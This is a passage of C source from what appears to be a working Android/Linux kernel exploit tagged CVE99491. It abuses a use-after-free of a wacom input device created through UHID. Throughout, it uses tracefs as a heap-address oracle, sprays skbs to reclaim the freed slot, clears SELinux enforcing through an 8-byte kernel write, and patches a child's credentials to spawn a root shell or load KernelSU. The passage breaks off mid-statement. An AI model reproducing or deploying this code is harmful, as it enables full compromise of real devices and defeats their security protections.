static int oracle_capture_cands(unsigned long long out[3], int *n_out) {
    struct oracle_rec rec[128];
    unsigned char *buf;
    int n = 0;

    trace_wr(TR_PATH "/tracing_on", "0");
    buf = malloc(4 << 20);
    if (!buf)
        return -1;
    for (int c = 0; c < 8; c++) {
        long got = trace_read_cpu(c, buf, 4 << 20);

        if (got > 0)
            n += oracle_collect(buf, (size_t)got, rec + n,
                                128 - n);
    }
    free(buf);
    /* wacom allocates pen, touch, then the pad sibling; the second
     * allocation in the first three-record group is usually
     * shared->touch_input, but the close-time kfree check decides. */
    for (int i = 0; i + 2 < n; i++) {
        if (rec[i].site == rec[i + 1].site &&
            rec[i].site == rec[i + 2].site) {
            out[0] = rec[i].ptr;
            out[1] = rec[i + 1].ptr;
            out[2] = rec[i + 2].ptr;
            *n_out = 3;
            return 0;
        }
    }
    return -1;
}

static int oracle_capture_touch(unsigned long long *out) {
    unsigned long long c[3];
    int n = 0;

    if (oracle_capture_cands(c, &n) < 0)
        return -1;
    *out = c[1];
    return 0;
}

/* One ring buffer can contain both the close-time kfree of the touch
 * sibling and the skb allocation our immediately-following sniff chunk
 * placed on it.  Walk it once: the kfree identifies the real touch
 * candidate; a matching skb allocation at that candidate means the slot
 * is already ours. */
static int oracle_free_alloc_scan(const unsigned char *b, size_t n,
                                  const unsigned long long *cand, int ncand,
                                  int *idx, int *alloc_hit) {
    int found = -1, hit = 0;

    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 24 && p + 24 <= end) {
                if (total < 40) {
                    unsigned long long q = trace_u64(b, p + 16);

                    for (int j = 0; j < ncand; j++)
                        if (q == cand[j])
                            found = j;
                } else if (found >= 0 && p + 40 <= end &&
                           trace_u64(b, p + 16) == cand[found] &&
                           trace_u64(b, p + 32) == 2048 &&
                           (!g_prof.spray_skb_req ||
                            trace_u64(b, p + 24) == g_prof.spray_skb_req)) {
                    hit = 1;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    if (found < 0)
        return -1;
    *idx = found;
    *alloc_hit = hit;
    return 0;
}

/* Read every CPU ring once: return the identified touch candidate, the
 * CPU that performed the close-time kfree, and whether the sniff spray
 * already owns the slot. */
static int oracle_free_alloc(const unsigned long long *cand, int ncand,
                             int *idx, int *cpu_out, int *alloc_hit) {
    unsigned char *buf;
    int found = -1, fcpu = -1, hit = 0;

    trace_wr(TR_PATH "/tracing_on", "0");
    buf = malloc(4 << 20);
    if (!buf)
        return -1;
    for (int c = 0; c < 8; c++) {
        long got = trace_read_cpu(c, buf, 4 << 20);

        if (got > 0) {
            int f = -1, h = 0;

            if (oracle_free_alloc_scan(buf, (size_t)got, cand, ncand, &f,
                                       &h) == 0) {
                if (found < 0) {
                    found = f;
                    fcpu = c;
                    hit = h;
                } else if (h) {
                    hit = 1;
                }
            }
        }
    }
    free(buf);
    if (found < 0)
        return -1;
    *idx = found;
    *cpu_out = fcpu;
    *alloc_hit = hit;
    return 0;
}

static int oracle_spray_begin(void) {
    trace_probe_event_enable(1);
    return trace_wr(TR_PATH "/tracing_on", "1") == 0 ? 0 : -1;
}

/* Scan one CPU's raw ring (cpu < 0 scans all CPUs). */
static int oracle_spray_match(unsigned long long ptr, int cpu) {
    unsigned char *buf;
    int hit = 0;
    int first = cpu >= 0 ? cpu : 0;
    int last = cpu >= 0 ? cpu + 1 : 8;

    trace_wr(TR_PATH "/tracing_on", "0");
    buf = malloc(4 << 20);
    if (!buf)
        return 0;
    for (int c = first; c < last && !hit; c++) {
        long got = trace_read_cpu(c, buf, 4 << 20);

        if (got > 0)
            hit = oracle_ptr_present(buf, (size_t)got, ptr);
    }
    free(buf);
    return hit;
}

static void oracle_end(void) {
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_probe_event_enable(0);
    trace_reset();
}

/* Leave the pad-trigger phase without a system-wide enabled kmem probe. */
static void oracle_shutdown(void) {
    trace_wr(TR_PATH "/tracing_on", "0");
    trace_probe_event_enable(0);
}

/* --- reclaim depth calibration (oracle -> workdir -> no-oracle) ------ */

#define RECLAIM_CALIB_NAME "reclaim-calib"

/*
 * The oracle measures the real number of same-CPU skbs needed to reach the
 * freed slot.  Persist it for the no-tracefs path on later boots; the
 * release and spray geometry must match or the value is ignored.
 */
static int reclaim_calib_write(long depth, const char *pattern) {
    char path[256], tmp[256];
    FILE *f;

    snprintf(path, sizeof(path), "%s/%s", g_prof.ksu_workdir,
             RECLAIM_CALIB_NAME);
    snprintf(tmp, sizeof(tmp), "%s.tmp", path);
    f = fopen(tmp, "w");
    if (!f)
        return -1;
    fprintf(f, "release=%s\nspray_len=%u\nburst=%ld\nstep=%u\n"
            "pattern=%s\nsource=oracle\ntime=%ld\n",
            g_prof.release, g_prof.spray_len, depth,
            g_prof.spray_burst_step, pattern, (long)time(NULL));
    if (fclose(f) != 0)
        return -1;
    return rename(tmp, path);
}

static int reclaim_calib_load(long *depth, const char *pattern) {
    char path[256], line[256];
    char rel[128] = "", pat[32] = "";
    unsigned int len = 0;
    long burst = 0;
    FILE *f;

    snprintf(path, sizeof(path), "%s/%s", g_prof.ksu_workdir,
             RECLAIM_CALIB_NAME);
    f = fopen(path, "r");
    if (!f)
        return -1;
    while (fgets(line, sizeof(line), f)) {
        char *nl = strchr(line, '\n');

        if (nl)
            *nl = 0;
        if (!strncmp(line, "release=", 8))
            snprintf(rel, sizeof(rel), "%s", line + 8);
        else if (!strncmp(line, "spray_len=", 10))
            len = (unsigned int)strtoul(line + 10, NULL, 0);
        else if (!strncmp(line, "burst=", 6))
            burst = atol(line + 6);
        else if (!strncmp(line, "pattern=", 8))
            snprintf(pat, sizeof(pat), "%s", line + 8);
    }
    fclose(f);
    if (strcmp(rel, g_prof.release) != 0 || len != g_prof.spray_len ||
        strcmp(pat, pattern) != 0 || burst < 1 || burst > 65536)
        return -1;
    *depth = burst;
    return 0;
}

/* SLUB geometry bound.  These counters are not an address oracle: they
 * bound how many allocations may be needed to reach a freed object, not
 * whether a given slot was reached.  Read-only and best-effort. */
#define RECLAIM_SLUB_DIR "/sys/kernel/slab/kmalloc-2k"

static int read_ulong_file(const char *path, unsigned long *out) {
    char buf[64];
    FILE *f = fopen(path, "r");

    if (!f)
        return -1;
    if (!fgets(buf, sizeof(buf), f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    if (sscanf(buf, "%lu", out) != 1)
        return -1;
    return 0;
}

static int reclaim_sysfs_bound(unsigned long *bound) {
    unsigned long ops = 0, cpu_partial = 0, objects_partial = 0;
    char path[128];

    snprintf(path, sizeof(path), "%s/objs_per_slab", RECLAIM_SLUB_DIR);
    if (read_ulong_file(path, &ops) != 0)
        return -1;
    snprintf(path, sizeof(path), "%s/cpu_partial", RECLAIM_SLUB_DIR);
    (void)read_ulong_file(path, &cpu_partial);
    snprintf(path, sizeof(path), "%s/objects_partial", RECLAIM_SLUB_DIR);
    (void)read_ulong_file(path, &objects_partial);
    /* Current slab + CPU partial + partial slabs, with a 2x margin. */
    *bound = (ops + cpu_partial + objects_partial) * 2;
    PLOG("slub objs_per_slab=%lu cpu_partial=%lu objects_partial=%lu "
         "bound=%lu\n", ops, cpu_partial, objects_partial, *bound);
    return 0;
}

/* --- reclaim timing probe (measurement only) ------------------------- */

/*
 * Measures where the touch input_dev is freed and whether a spray skb
 * lands in that slot.  The evdev fd holds the input_dev alive across the
 * UHID destroy; closing it (after the other openers are gone) should
 * perform the kfree on this task's CPU.  No pad report is sent, so this
 * never walks the dangling chain.
 */
struct reclaim_probe_opts {
    int hold;
    int pad;
    int wait_ms;
    int spray_n;
    int cpu;
    int allcpu;
    int spread_ms;
    int kfree;
    int noclose;
    int freedelay;
    int fill;
    int inotify;
    int inotify_timeout;
};

static int probe_event_num(const char *name) {
    int n = 0;
    const char *p = name;

    while (*p && (*p < '0' || *p > '9'))
        p++;
    while (*p >= '0' && *p <= '9')
        n = n * 10 + (*p++ - '0');
    return n;
}

/*
 * The wacom probe allocates pen, touch and pad inputs but only registers
 * the type(s) present in the descriptor.  The touch descriptor registers
 * exactly one node, named "... Finger"; prefer that name and fall back to
 * the first node carrying the pair phys.
 */
static int probe_second_new_event(const char old[MAXEV][16], int nold,
                                  char *out, size_t outsz,
                                  char *name, size_t namesz) {
    char cur[MAXEV][16], fresh[MAXEV][16];
    int n = list_events(cur);
    int m = 0;
    char first_path[32] = "", first_name[64] = "";

    for (int i = 0; i < n; i++) {
        int seen = 0;

        for (int j = 0; j < nold; j++)
            if (!strcmp(cur[i], old[j])) {
                seen = 1;
                break;
            }
        if (!seen && m < MAXEV)
            snprintf(fresh[m++], 16, "%s", cur[i]);
    }
    for (int i = 0; i < m; i++)
        for (int j = i + 1; j < m; j++)
            if (probe_event_num(fresh[j]) < probe_event_num(fresh[i])) {
                char t[16];

                snprintf(t, sizeof(t), "%s", fresh[i]);
                snprintf(fresh[i], sizeof(fresh[i]), "%s", fresh[j]);
                snprintf(fresh[j], sizeof(fresh[j]), "%s", t);
            }
    for (int i = 0; i < m; i++) {
        char path[32], phys[64] = "", nm[64] = "";
        int fd, match;

        snprintf(path, sizeof(path), "/dev/input/%s", fresh[i]);
        fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        if (fd >= 0) {
            ioctl(fd, EVIOCGPHYS(sizeof(phys) - 1), phys);
            ioctl(fd, EVIOCGNAME(sizeof(nm) - 1), nm);
        }
        match = fd >= 0 && !strcmp(phys, PHYS_COMMON);
        printf("[reclaim] node=%s fd=%d phys=\"%s\" name=\"%s\" match=%d\n",
               path, fd, phys, nm, match);
        if (fd >= 0)
            close(fd);
        if (!match)
            continue;
        if (!first_path[0]) {
            snprintf(first_path, sizeof(first_path), "%s", path);
            snprintf(first_name, sizeof(first_name), "%s", nm);
        }
        if (strstr(nm, "Finger") || strstr(nm, "touch")) {
            snprintf(out, outsz, "%s", path);
            snprintf(name, namesz, "%s", nm);
            return 0;
        }
    }
    if (first_path[0]) {
        snprintf(out, outsz, "%s", first_path);
        snprintf(name, namesz, "%s", first_name);
        return 0;
    }
    return -1;
}

/* Print every kfree record at `ptr`; kmem:kfree has call_site+ptr only, so
 * its record is shorter than an allocation record. */
static int probe_scan_free(const unsigned char *b, size_t n,
                           unsigned long long ptr, int cpu) {
    int found = 0;

    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 24 && total < 40 && p + 24 <= end &&
                trace_u64(b, p + 16) == ptr) {
                printf("[reclaim] free cpu=%d ptr=%#llx site=%#llx "
                       "total=%zu\n", cpu, ptr, trace_u64(b, p + 8), total);
                found++;
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return found;
}

/* Print every 2k allocation record at `ptr`; return the match count. */
static int probe_scan_ptr(const unsigned char *b, size_t n,
                          unsigned long long ptr, int cpu) {
    int found = 0;

    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;

        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 40 <= end &&
                trace_u64(b, p + 16) == ptr &&
                trace_u64(b, p + 32) == 2048) {
                printf("[reclaim] rec cpu=%d ptr=%#llx req=%llu alloc=%llu "
                       "site=%#llx\n", cpu, ptr,
                       trace_u64(b, p + 24), trace_u64(b, p + 32),
                       trace_u64(b, p + 8));
                found++;
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return found;
}

static int reclaim_probe(int argc, char **argv) {
    struct reclaim_probe_opts o = { .hold = 1, .pad = 0, .wait_ms = 300,
                                    .spray_n = 1, .cpu = 0, .allcpu = 0,
                                    .spread_ms = 0, .kfree = 0, .noclose = 0,
                                    .freedelay = 100, .fill = 0,
                                    .inotify = 0, .inotify_timeout = 3000 };
    char old[MAXEV][16], node[32] = "", name[64] = "";
    unsigned long long touch = 0;
    unsigned char *spray_buf, *rb;
    int nold, fd_t = -1, fd_p = -1, evfd = -1, cap, matches = 0, i;
    int free_recs = 0, armed = 0, ev_rc = -1;
    struct evdev_close_watch iw = { .fd = -1, .wd = -1 };
    long ev_el = 0;
    cpu_set_t set;

    for (i = 2; i < argc; i++) {
        if (!strncmp(argv[i], "--hold=", 7))
            o.hold = atoi(argv[i] + 7);
        else if (!strncmp(argv[i], "--pad=", 6))
            o.pad = atoi(argv[i] + 6);
        else if (!strncmp(argv[i], "--wait=", 7))
            o.wait_ms = atoi(argv[i] + 7);
        else if (!strncmp(argv[i], "--spray=", 8))
            o.spray_n = atoi(argv[i] + 8);
        else if (!strncmp(argv[i], "--cpu=", 6))
            o.cpu = atoi(argv[i] + 6);
        else if (!strncmp(argv[i], "--allcpu=", 9))
            o.allcpu = atoi(argv[i] + 9);
        else if (!strncmp(argv[i], "--spread=", 9))
            o.spread_ms = atoi(argv[i] + 9);
        else if (!strncmp(argv[i], "--kfree=", 8))
            o.kfree = atoi(argv[i] + 8);
        else if (!strncmp(argv[i], "--noclose=", 10))
            o.noclose = atoi(argv[i] + 10);
        else if (!strncmp(argv[i], "--freedelay=", 12))
            o.freedelay = atoi(argv[i] + 12);
        else if (!strncmp(argv[i], "--fill=", 7))
            o.fill = atoi(argv[i] + 7);
        else if (!strncmp(argv[i], "--inotify=", 10))
            o.inotify = atoi(argv[i] + 10);
        else if (!strncmp(argv[i], "--inotify-timeout=", 18))
            o.inotify_timeout = atoi(argv[i] + 18);
        else {
            fprintf(stderr, "usage: %s reclaim-probe [--hold=0|1] "
                    "[--pad=0|1] [--wait=MS] [--spray=N] [--cpu=N] "
                    "[--allcpu=0|1] [--spread=MS] [--kfree=0|1] "
                    "[--noclose=0|1] [--freedelay=MS] [--fill=N] "
                    "[--inotify=0|1] [--inotify-timeout=MS]\n",
                    argv[0]);
            return 2;
        }
    }
    CPU_ZERO(&set);
    CPU_SET(o.cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        return 1;
    }
    g_prof.spray_len = 1664;
    g_prof.spray_pairs = 24;
    if (spray_setup() < 0)
        return 1;
    nold = list_events(old);
    if (oracle_capture_begin() != 0) {
        printf("[reclaim] result=fail tracefs\n");
        return 1;
    }
    fd_t = uhid_open();
    if (fd_t < 0 ||
        uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                    sizeof(rdesc_touch)) < 0) {
        printf("[reclaim] result=fail uhid\n");
        if (fd_t >= 0)
            close(fd_t);
        oracle_end();
        return 1;
    }
    pump_until_start(fd_t, now_ms() + 2000);
    usleep(50000);
    cap = oracle_capture_touch(&touch);
    oracle_end();
    printf("[reclaim] capture=%d touch=%#llx\n", cap, touch);
    if (cap != 0) {
        uhid_destroy(fd_t);
        close(fd_t);
        return 1;
    }
    if (o.hold) {
        if (probe_second_new_event(old, nold, node, sizeof(node),
                                   name, sizeof(name)) < 0) {
            printf("[reclaim] result=fail no second evdev\n");
            uhid_destroy(fd_t);
            close(fd_t);
            return 1;
        }
        evfd = open(node, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
        printf("[reclaim] hold=%d node=%s name=%s fd=%d\n", o.hold, node,
               name, evfd);
        if (evfd >= 0 && o.inotify) {
            if (evdev_watch_open(&iw, node) == 0)
                printf("[reclaim] inotify watch %s\n", node);
            else
                printf("[reclaim] inotify watch failed: %s\n",
                       strerror(errno));
        }
        if (evfd < 0) {
            uhid_destroy(fd_t);
            close(fd_t);
            return 1;
        }
    }
    if (o.pad) {
        fd_p = uhid_open();
        if (fd_p < 0 ||
            uhid_create(fd_p, NAME_PAD, PHYS_COMMON, 0x1102, rdesc_pad,
                        sizeof(rdesc_pad)) < 0) {
            printf("[reclaim] result=fail pad\n");
            if (fd_p >= 0)
                close(fd_p);
            uhid_destroy(fd_t);
            close(fd_t);
            return 1;
        }
        pump_until_start(fd_p, now_ms() + 2000);
        usleep(50000);
    }
    if (o.kfree && (!o.hold || o.noclose)) {
        if (oracle_spray_begin() != 0) {
            printf("[reclaim] result=fail tracefs-kfree\n");
            uhid_destroy(fd_t);
            close(fd_t);
            return 1;
        }
        armed = 1;
    }
    uhid_destroy(fd_t);
    close(fd_t);
    if (iw.fd >= 0) {
        ev_rc = evdev_watch_wait(&iw, o.inotify_timeout, &ev_el);
        printf("[reclaim] inotify ev=%d elapsed=%ld\n", ev_rc, ev_el);
    }
    usleep((useconds_t)o.wait_ms * 1000);
    if (o.fill > 0 && o.hold) {
        unsigned char *fb = malloc(g_prof.spray_len);

        if (fb) {
            memset(fb, 0x42, g_prof.spray_len);
            (void)spray_local(o.fill, fb);
            free(fb);
        }
    }
    if (evfd >= 0 && !o.noclose) {
        /* Arm just before the close: the wait can run for seconds and
         * would otherwise flood the per-CPU ring before the free. */
        if (o.kfree && !armed) {
            if (oracle_spray_begin() != 0) {
                printf("[reclaim] result=fail tracefs-kfree\n");
                return 1;
            }
            armed = 1;
        }
        close(evfd);
        evfd = -1;
    }
    if (o.kfree) {
        /* Let a close-triggered free land in the ring, then scan every
         * CPU so the record's CPU identifies who dropped the last ref. */
        usleep((useconds_t)o.freedelay * 1000);
        trace_wr(TR_PATH "/tracing_on", "0");
        rb = malloc(4 << 20);
        if (rb) {
            for (int c = 0; c < 8; c++) {
                long got = trace_read_cpu(c, rb, 4 << 20);

                if (got > 0)
                    free_recs += probe_scan_free(rb, (size_t)got, touch, c);
            }
            free(rb);
            rb = NULL;
        }
        printf("[reclaim] free_records=%d\n", free_recs);
        trace_wr(TR_PATH "/tracing_on", "1");
    } else if (oracle_spray_begin() != 0) {
        printf("[reclaim] result=fail tracefs-spray\n");
        oracle_end();
        return 1;
    }
    spray_buf = malloc(g_prof.spray_len);
    if (!spray_buf) {
        oracle_end();
        return 1;
    }
    memset(spray_buf, 0x41, g_prof.spray_len);
    if (o.spray_n > 0) {
        int sr;

        if (o.spread_ms > 0)
            sr = spray_spread(o.spray_n, o.spread_ms, spray_buf);
        else if (o.allcpu)
            sr = spray_fire(o.spray_n, spray_buf);
        else
            sr = spray_local(o.spray_n, spray_buf);
        if (sr < 0) {
            printf("[reclaim] result=fail spray\n");
            oracle_end();
            free(spray_buf);
            return 1;
        }
    }
    usleep(20000);
    trace_wr(TR_PATH "/tracing_on", "0");
    rb = malloc(4 << 20);
    if (rb) {
        for (int c = 0; c < 8; c++) {
            long got = trace_read_cpu(c, rb, 4 << 20);

            if (got > 0)
                matches += probe_scan_ptr(rb, (size_t)got, touch, c);
        }
        free(rb);
    }
    oracle_end();
    evdev_watch_close(&iw);
    free(spray_buf);
    if (fd_p >= 0)
        close(fd_p);
    printf("[reclaim] result=%s hold=%d pad=%d wait=%d spray=%d "
           "free=%d ev=%d matches=%d\n",
           matches ? "hit" : "miss", o.hold, o.pad, o.wait_ms, o.spray_n,
           free_recs, ev_rc, matches);
    return 0;
}

/* --- tracefs wait-mode child and escalation helpers ------------------ */

static int read_line_timeout(int fd, char *buf, size_t cap, long timeout_ms) {
    size_t got = 0;
    long dl = now_ms() + timeout_ms;
    while (got + 1 < cap) {
        long left = dl - now_ms();
        struct pollfd p;
        int rc;
        ssize_t n;

        if (left <= 0)
            break;
        p.fd = fd;
        p.events = POLLIN;
        p.revents = 0;
        rc = poll(&p, 1, (int)left);
        if (rc < 0)
            return -1;
        if (rc == 0)
            break;
        n = read(fd, buf + got, 1);
        if (n <= 0)
            break;
        got++;
        if (buf[got - 1] == '\n')
            break;
    }
    buf[got] = 0;
    return (int)got;
}

/* Read one Cap* value from the calling task's own /proc/self/status. */
static unsigned long long self_status_cap(const char *key) {
    char b[4096];
    int f = open("/proc/self/status", O_RDONLY);
    int n;
    char *p;

    if (f < 0)
        return ~0ULL;
    n = (int)read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0)
        return ~0ULL;
    b[n] = 0;
    p = strstr(b, key);
    if (!p)
        return ~0ULL;
    p += strlen(key);
    while (*p == ' ' || *p == '\t')
        p++;
    return strtoull(p, NULL, 16);
}

#ifndef __NR_capset
#define __NR_capset 91 /* generic arm64 syscall table */
#endif

static int read_full(int fd, void *buf, size_t n) {
    unsigned char *p = buf;
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, p + got, n - got);
        if (r <= 0)
            return -1;
        got += (size_t)r;
    }
    return 0;
}

#define CHILD_HELLO 0x9941cce1U

/*
 * After exec the child owns a private committed cred (the one the tracefs
 * path leaks).  'p' reports uid/euid/gid/egid, 'V' reports its capability
 * sets, 'X' turns the now-uid-0 child into /system/bin/sh, and 'K' runs the
 * inline KernelSU loader in the child's patched cred.
 */
static int wait_child_main(void) {
    static int quiet;
    setvbuf(stdout, NULL, _IONBF, 0);
    uint32_t hello = CHILD_HELLO;
    (void)!write(4, &hello, sizeof(hello));
    for (;;) {
        char c;
        ssize_t n = read(3, &c, 1);
        uint32_t ids[4];
        if (n <= 0) {
            if (!quiet) {
                int fd = open("/dev/null", O_RDWR);

                if (fd >= 0) {
                    dup2(fd, 0);
                    dup2(fd, 1);
                    dup2(fd, 2);
                    if (fd > 2)
                        close(fd);
                }
                quiet = 1;
            }
            usleep(10000);
            continue;
        }
        ids[0] = (uint32_t)getuid();
        ids[1] = (uint32_t)geteuid();
        ids[2] = (uint32_t)getgid();
        ids[3] = (uint32_t)getegid();
        if (c == 'p') {
            /* probe only: never touches the cred, keeps its address stable */
            (void)!write(4, ids, sizeof(ids));
        } else if (c == 'V') {
            char line[256];
            unsigned long long eff = ~0ULL;
            int len;

            (void)probe_caps(&eff);
            len = snprintf(line, sizeof(line), "v prm=%llx eff=%llx bnd=%llx\n",
                           self_status_cap("CapPrm:"), eff,
                           self_status_cap("CapBnd:"));
            (void)!write(4, line, (size_t)len);
        } else if (c == 'F') {
            /* Direct engine: report setfsuid(-1) without changing the cred
             * (returns the previous fsuid), so the parent can verify the
             * fsuid=0 write landed. */
            unsigned int fs = (unsigned int)setfsuid((uid_t)-1);

            (void)!write(4, &fs, sizeof(fs));
        } else if (c == 'K') {
            /* Direct engine endgame: prefer the app's proven ksud CLI
             * (`ksud late-load --kmi ... --allow-shell --package-name ...`),
             * which the 98260 path already uses on this device; fall back
             * to the in-place libksud.so late-load. */
            const char *kcli = getenv("CVE99491_KSU_CLI");
            const char *kmi = getenv("CVE99491_KMI");
            const char *mgr = getenv("CVE99491_KSU_MANAGER");
            const char *kbin = (kcli && *kcli) ? kcli : "/data/local/tmp/ksud";

            /* 环境变量是 fork 之后在父进程里 setenv 的，孩子继承不到；
             * 这里用已知路径兜底，执行 App 98260 路径验证过的同一条命令。 */
            if (access(kbin, X_OK) == 0) {
                execl(kbin, "ksud", "late-load",
                      "--kmi", (kmi && *kmi) ? kmi : "android17-6.18",
                      "--allow-shell", "--package-name",
                      (mgr && *mgr) ? mgr : "me.weishu.kernelsu",
                      (char *)NULL);
                _exit(5);
            }
            execl("/proc/self/exe", "exp", "late-load", (char *)NULL);
            _exit(4);
        } else if (c == 'X') {
            execl("/system/bin/sh", "sh", "-c",
                  "id; echo ---; getenforce; echo ---; "
                  "grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd):' "
                  "/proc/self/status",
                  (char *)NULL);
            _exit(3);
        } else if (c == 'Q') {
            _exit(0);
        }
    }
}

/*
 * Fork a child that re-execs this binary in wait mode on `cpu`, so its
 * exec allocates a private committed cred we can leak and then patch.
 * Returns the pid; fd 3 (commands) / fd 4 (status) are handed back.
 */
static pid_t spawn_wait_child(int cpu, int *go_out, int *st_out) {
    int go[2], st[2];
    pid_t p;

    if (pipe(go) || pipe(st))
        return -1;
    p = fork();
    if (p == 0) {
        char ch;
        int g2, s2;
        cpu_set_t set;
        close(go[1]);
        close(st[0]);
        CPU_ZERO(&set);
        CPU_SET(cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
        g2 = fcntl(go[0], F_DUPFD, 20);
        s2 = fcntl(st[1], F_DUPFD, 20);
        if (g2 < 0 || s2 < 0)
            _exit(125);
        close(go[0]);
        close(st[1]);
        dup2(g2, 3);
        close(g2);
        dup2(s2, 4);
        close(s2);
        setsid();
        if (read(3, &ch, 1) != 1)
            _exit(126);
        execl("/proc/self/exe", "exp", "wait", (char *)NULL);
        _exit(127);
    }
    if (p < 0) {
        close(go[0]);
        close(go[1]);
        close(st[0]);
        close(st[1]);
        return -1;
    }
    close(go[0]);
    close(st[1]);
    *go_out = go[1];
    *st_out = st[0];
    return p;
}

static void park_on_fail(const char *why) {
    (void)cve99491_parked_mark_in(g_run_dir);
    fprintf(stderr, "[-] %s; PARKED (reboot required)\n", why);
}

/* --- mode selection -------------------------------------------------- */

enum exp_mode {
    MODE_REAL_CRED = 0,
    MODE_TRACEFS,
    MODE_NO_TRACEFS_FAKECRED, /* CLI name: no-tracefs */
};

struct exp_opts {
    int cpu;
    long spray_n;
    long spread_ms;
};

/*
 * --stage=trigger: decisive "does the pad report reach the reclaimed touch
 * input_dev after the UAF?" probe.  It writes exactly one fixed word (the
 * EV_SW value {05 00 0e 00 v 00 00 00}, because input_sync()'s EV_SYN value
 * is gated out by the fake evbit) at selinux_state-1 so the word's byte1
 * clears enforcing, then re-reads /sys/fs/selinux/enforce:
 *   before=1 after=0 -> pad report reached our fake dev and the store
 *                       landed (UAF trigger + 8-byte write primitive usable);
 *   before=1 after=1 -> the report did not reach the reclaimed dev, or the
 *                       word did not land.
 * CVE99491_TRIGGER_MODE=chain sends the same fixed word through the
 * fake-handle chain (same pad trigger, same observable byte), isolating the
 * direct-vals store from the chain path.
 * No other kernel field is meaningfully touched and no module is loaded; the
 * permissive state is recovered by the required reboot (the run parks).
 */
static int run_trigger_probe(struct anchor *a, unsigned long long base,
                             unsigned long long slide,
                             const struct exp_opts *o) {
    struct pchain pa;
    unsigned long long sel;
    int before, after;

    memset(&pa, 0, sizeof(pa));
    pa.a = a;
    pa.base = base;
    pa.slide = slide;
    pa.pad_fd = -1;
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    if (pin_cpu(o->cpu) != 0) {
        perror("sched_setaffinity");
        return 1;
    }
    if (spray_setup() < 0 || rd_page_setup() < 0)
        return 1;
    g_fire_cap = 8;
    (void)cve99491_parked_mark_in(g_run_dir);

    sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
    {
        const char *tm = getenv("CVE99491_TRIGGER_MODE");

        g_trigger_chain = tm && !strcmp(tm, "chain");
    }
    if (!g_trigger_chain) {
        /* 6.18 的 input_sync() EV_SYN 会被 evbit 挡掉，SYN 零词不会追加；
         * 唯一可观测的是 wacom MUTE 产生的 EV_SW 固定词
         * {05 00 0e 00 V 00 00 00}。落在 sel-1 时 sel+0(enforcing)=0x00。 */
        g_trigger_vals = sel - 1;
    }
    before = selinux_enforce_now();
    printf("[step] trigger probe: mode=%s enforce_before=%d vals_target=%#llx "
           "selinux_state=%#llx\n", g_trigger_chain ? "chain" : "direct",
           before, g_trigger_chain ? sel : g_trigger_vals, sel);
    PLOG("trigger probe mode=%s before=%d vals=%#llx sel=%#llx\n",
         g_trigger_chain ? "chain" : "direct", before,
         g_trigger_chain ? sel : g_trigger_vals, sel);

    {
        int prc;

        if (g_trigger_chain) {
            /* Chain variant: pchain_first's fake-handle flush forwards the
             * pre-filled EV_SYN record to the fake dev in the anchor, which
             * appends the 8-byte zero input_value at selinux_state. */
            prc = pchain_first(&pa, sel, EV_SYN, SYN_REPORT, 0, o->spray_n,
                               o->spread_ms);
        } else {
            prc = pchain_first(&pa, 0, EV_PWR, 0, 0, o->spray_n,
                               o->spread_ms);
        }
        if (prc < 0)
            abort_armed_and_park("trigger probe: UAF/reclaim not verified");
    }

    usleep(20000);
    after = selinux_enforce_now();
    printf("[dbg] trigger probe: mode=%s enforce before=%d after=%d\n",
           g_trigger_chain ? "chain" : "direct", before, after);
    PLOG("trigger probe mode=%s after=%d\n",
         g_trigger_chain ? "chain" : "direct", after);
    if (before == 1 && after == 0) {
        printf("[+] trigger probe: %s path reached the reclaimed input_dev; "
               "fixed zero word landed on selinux_state\n",
